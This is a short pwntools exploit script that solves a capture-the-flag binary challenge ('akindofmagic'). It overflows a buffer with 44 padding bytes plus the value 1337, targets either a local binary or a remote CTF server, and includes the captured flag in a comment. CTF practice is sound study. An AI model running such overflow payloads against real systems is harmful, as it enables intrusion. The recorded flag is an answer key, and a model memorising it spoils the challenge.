import sys
from pwn import *

# Flag : flag{i_hope_its_still_cool_to_use_1337_for_no_reason}

if sys.argv[1] == "local":
	elf = ELF("./akindofmagic")
	prog = elf.process()
if sys.argv[1] == "remote":
	prog = remote('143.198.184.186', 5000)

print(prog.recvuntil("\n"))
payload = b"A"*44+b"\x39\x05\x00\x00\x00"
prog.sendline(payload)
print(prog.recvuntil("\n"))
print(prog.recvuntil("\n"))
print(prog.recvuntil("\n"))

prog.interactive()

#sys.stdout.buffer.write(payload)
